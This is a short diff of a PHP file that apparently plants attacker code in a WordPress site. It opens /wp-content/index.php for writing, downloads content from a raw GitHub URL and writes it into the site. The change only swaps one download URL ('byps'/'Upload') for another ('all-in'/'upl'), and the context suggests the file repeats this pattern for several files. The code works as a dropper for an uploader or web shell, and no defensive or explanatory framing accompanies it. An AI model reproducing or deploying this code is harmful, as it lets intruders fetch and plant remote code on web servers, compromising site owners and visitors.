@@ -9,7 +9,7 @@
  fclose($nama3); ?>
  
  <?php $nama4= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/index.php' ,'w+');
-  $file4 = file_get_contents('https://raw.githubusercontent.com/prokontra/byps/main/Upload');
+  $file4 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/upl');
   $tulis4 = fwrite ($nama4 ,$file4);
  fclose($nama4); ?>
  
